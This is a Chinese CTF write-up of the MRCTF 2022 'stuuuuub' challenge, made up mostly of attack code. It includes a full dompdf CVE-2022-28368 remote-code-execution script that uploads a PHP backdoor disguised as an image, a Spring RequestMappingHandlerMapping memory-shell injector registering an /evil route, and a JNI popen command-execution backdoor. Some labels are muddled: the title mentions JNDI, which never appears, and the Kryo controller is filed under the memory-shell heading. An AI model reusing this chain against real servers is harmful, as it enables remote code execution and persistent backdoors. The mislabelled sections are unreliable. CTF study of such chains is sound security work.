---
title: MRCTF 2022 stuuuuub 题解 (Android 一代壳 + dompdf + Kryo + Spring JNDI)
contest: MRCTF
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [Android 一代壳, JNI_OnLoad, /readflag 算术, dompdf 远程字体, Kryo 反序列化, Spring RequestMappingHandlerMapping 内存马, JNI exec]
attack_chain: |
  1. Android 一代壳 (StubApp): smali 注入 + JNI_OnLoad + start_subprocess 启动 /readflag
     - 父进程 fork + pipe 创建 stdin/stdout
     - readnum() 读整数 + 算术题 (a + b)
  2. dompdf 远程字体加载 RCE (CVE-2022-28368):
     - @font-face src: url('http://localhost:81{php_location}')
     - 上传 exp.php → 拿 php_location (上传到 /storage/)
     - 上传 exp.css 含 @font-face 引用 php
     - 上传 exp.html 含 <link rel=stylesheet href=exp.css>
     - print2pdf(html) → 触发 dompdf 下载字体 → 执行 PHP
     - 字体缓存路径: /vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5}.php
  3. Kryo 反序列化 (Mocha.class 序列化):
     - POST /coffee/demo {"polish": true, "References": true, ...}
     - 反射 kryo.setReferences(true) 等 setter
     - kryo.register(Mocha.class) → 写 Mocha → base64 返回
  4. Spring RequestMappingHandlerMapping 内存马:
     - 反射获取 mappingHandlerMapping
     - 反射获取 urlLookup Map
     - registerMapping(info, evilClass.newInstance(), method2) 注册 /evil 路由
  5. JNI exec (Java + JNI):
     - MSpringJNIController doExec(String cmd) → execmd(cmd, result) → popen + strcat
     - jstring cmdresult = env->NewStringUTF(return_messge)
key_payload: |
  # dompdf RCE:
  import requests
  from hashlib import md5
  
  url = "http://246abfb2-0f91-48ec-a88c-b2314709ed87.node1.mrctf.fun:81"
  font_name = "eki"
  
  def upload(filename, raw):
      data = {"name": "avatar", "type": "image"}
      res = requests.post(f"{url}/public/index.php?s=admin/upload",
                          data=data, files={"file": (filename, raw, "image/png")})
      return res.json()["result"]
  
  # 1. 上传 PHP 后门
  exp_font = "./exp.php"
  php_location = upload("exp.php", open(exp_font, "rb").read())
  
  # 2. 上传 CSS 引用 PHP
  exp_css = f"""@font-face {{
      font-family: '{font_name}';
      src: url('http://localhost:81{php_location}');
      font-weight: 'normal';
      font-style: 'normal';
  }}"""
  css_location = upload("exp.css", exp_css)
  
  # 3. 上传 HTML 引用 CSS
  html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'>"""
  html_location = upload("exp.html", html)
  
  # 4. 触发 print2pdf
  res = requests.get(f"{url}/public/index.php", params={"s": "Printer/print", "page": html_location})
  
  # 5. 计算字体缓存路径
  md5helper = md5()
  md5helper.update(f"http://localhost:81{php_location}".encode())
  remote_path = f"/vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5helper.hexdigest()}.php"
  print(requests.get(url + remote_path).text)
  
  # Spring 内存马:
  @RequestMapping("/coffee/demo")
  public Message demoFlavor(@RequestBody String raw) throws Exception {
      JSONObject serializeConfig = new JSONObject(raw);
      if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
          kryo = new Kryo();
          for (Method setMethod : kryo.getClass().getDeclaredMethods()) {
              if (!setMethod.getName().startsWith("set")) continue;
              Object p1 = serializeConfig.get(setMethod.getName().substring(3));
              if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                  try {
                      p1 = Class.forName((String) p1).newInstance();
                      setMethod.invoke(kryo, p1);
                  } catch (Exception e) { e.printStackTrace(); }
              } else {
                  setMethod.invoke(kryo, p1);
              }
          }
      }
      // kryo.writeClassAndObject(Mocha) → base64
  }
one_liner: MRCTF 2022 stuuuuub: Android 一代壳 (JNI_OnLoad + /readflag 算术) + dompdf CVE-2022-28368 字体 RCE + Kryo 反序列化 + Spring RequestMappingHandlerMapping 内存马 + JNI exec。
lesson: |
  - dompdf 1.2.0 之前 @font-face 远程字体加载可 RCE (CVE-2022-28368)
  - 字体缓存路径: /vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5(url)}.php
  - Spring RequestMappingHandlerMapping 反射注入内存马
  - Kryo 反射设置 setReferences / setRegistrationRequired 等
  - Android 一代壳: smali 注入 + JNI_OnLoad 启动子进程
  - /readflag 算术题: a + b = ans, 父进程 pipe 通信
quality: high
---

# MRCTF 2022 stuuuuub 题解

> 来源: ctfiot.com 95798

## 题型组合

复合题，包含 **5 个子漏洞**：

1. **Android 一代壳（StubApp）**
2. **dompdf 远程字体 RCE (CVE-2022-28368)**
3. **Kryo 反序列化**
4. **Spring RequestMappingHandlerMapping 内存马**
5. **JNI exec 后门**

## 1. Android 一代壳

```c
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    return JNI_VERSION_1_4;  // 必须返回版本
}

static int start_subprocess(char *command[], int *pid, int *infd, int *outfd) {
    int p1[2], p2[2];
    if (pipe(p1) == -1) goto err_pipe1;
    if (pipe(p2) == -1) goto err_pipe2;
    if ((*pid = fork()) == -1) goto err_fork;
    if (*pid) {
        // 父进程
        *infd = p1[1];
        *outfd = p2[0];
        close(p1[0]); close(p2[1]);
        return 1;
    } else {
        // 子进程
        dup2(p1[0], 0);
        dup2(p2[1], 1);
        close(p1[0]); close(p1[1]);
        close(p2[0]); close(p2[1]);
        execvp(*command, command);
    }
}

void solve(char* buf) {
    int pid, infd, outfd;
    char *cmd[2] = {"/readflag", 0};
    start_subprocess(cmd, &pid, &outfd, &infd);
    read(infd, buf, strlen("please answer the challenge below first:\n"));
    int a, b;
    a = readnum(infd); b = readnum(infd);
    int ans = a + b;
    char v_str[1000];
    sprintf(v_str, "%d\n", ans);
    write(outfd, v_str, strlen(v_str));
    read(infd, buf, 1000);
}
```

父进程 fork + pipe → 启动 `/readflag` 子进程 → 算术题 (a + b) → 答对拿 flag。

## 2. dompdf 远程字体 RCE (CVE-2022-28368)

```python
import requests
from hashlib import md5

url = "http://246abfb2-0f91-48ec-a88c-b2314709ed87.node1.mrctf.fun:81"
font_name = "eki"

def upload(filename, raw):
    data = {"name": "avatar", "type": "image"}
    res = requests.post(f"{url}/public/index.php?s=admin/upload",
                        data=data, files={"file": (filename, raw, "image/png")})
    return res.json()["result"]

# 1. 上传 PHP 后门
php_location = upload("exp.php", open("./exp.php", "rb").read())

# 2. CSS 引用 PHP
exp_css = f"""@font-face {{
    font-family: '{font_name}';
    src: url('http://localhost:81{php_location}');
    font-weight: 'normal';
    font-style: 'normal';
}}"""
css_location = upload("exp.css", exp_css)

# 3. HTML 引用 CSS
html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'>"""
html_location = upload("exp.html", html)

# 4. 触发 print2pdf
res = requests.get(f"{url}/public/index.php",
                   params={"s": "Printer/print", "page": html_location})

# 5. 字体缓存路径: {font_name}-normal_{md5(url)}.php
md5helper = md5()
md5helper.update(f"http://localhost:81{php_location}".encode())
remote_path = f"/vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5helper.hexdigest()}.php"
print(requests.get(url + remote_path).text)
```

## 3. Kryo 反序列化

```java
@RequestMapping("/coffee/demo")
public Message demoFlavor(@RequestBody String raw) throws Exception {
    JSONObject serializeConfig = new JSONObject(raw);
    if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
        kryo = new Kryo();
        // 反射设置 kryo.setXxx() (kryo.getClass().getDeclaredMethods())
        for (Method setMethod : kryo.getClass().getDeclaredMethods()) {
            if (!setMethod.getName().startsWith("set")) continue;
            Object p1 = serializeConfig.get(setMethod.getName().substring(3));
            if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                p1 = Class.forName((String) p1).newInstance();
                setMethod.invoke(kryo, p1);
            } else {
                setMethod.invoke(kryo, p1);
            }
        }
    }
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    Output output = new Output(bos);
    kryo.register(Mocha.class);
    kryo.writeClassAndObject(output, new Mocha());
    return new Message(200, "Mocha!", Base64.getEncoder().encodeToString(bos.toByteArray()));
}
```

```python
def demo():
    data = {
        "polish": True,
        "References": True,
        "RegistrationRequired": False,
        "InstantiatorStrategy": "org.objenesis.strategy.StdInstantiatorStrategy",
    }
    return requests.post(url + "/coffee/demo", json=data).json()
```

## 4. Spring RequestMappingHandlerMapping 内存马

```java
static {
    try {
        String inject_uri = "/evil";
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder
            .currentRequestAttributes().getAttribute(
                "org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(
            RequestMappingHandlerMapping.class);
        
        // 反射获取 mappingRegistry
        Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass()
            .getDeclaredField("mappingRegistry");
        f.setAccessible(true);
        Object mappingRegistry = f.get(mappingHandlerMapping);
        
        // 反射获取 urlLookup
        Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
        Field field = c.getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
        
        // 注册新路由
        Class<?> evilClass = MSpringJNIController.class;
        Method method2 = evilClass.getMethod("index");
        RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
        option.setPatternParser(new PathPatternParser());
        RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
        mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
    } catch (Exception e) { e.printStackTrace(); }
}

public class MSpringJNIController {
    public native String doExec(String cmd);
    @ResponseBody
    public void index() throws IOException {
        // 调用 doExec
    }
}
```

## 5. JNI exec

```c
int execmd(const char *cmd, char *result) {
    char buffer[1024*12];
    FILE *pipe = popen(cmd, "r");
    if (!pipe) return 0;
    while (!feof(pipe)) {
        if (fgets(buffer, 256, pipe)) strcat(result, buffer);
    }
    pclose(pipe);
    return 1;
}

JNIEXPORT jstring JNICALL Java_xyz_eki_serialexp_memshell_MSpringJNIController_doExec(
    JNIEnv *env, jobject thisObj, jstring jstr) {
    const char *cstr = env->GetStringUTFChars(jstr, NULL);
    char result[1024 * 12] = "";
    execmd(cstr, result);
    char return_messge[256] = "";
    strcat(return_messge, result);
    jstring cmdresult = env->NewStringUTF(return_messge);
    return cmdresult;
}
```

## 评价

MRCTF 2022 综合实战题，5 个子漏洞组成完整攻击链：
- Android JNI 一代壳 → dompdf 字体 RCE → Kryo 反序列化 → Spring 内存马 → JNI exec

每个子漏洞都对应一个独立 CVE / 安全研究热点，组合起来是"全栈安全"的典范。
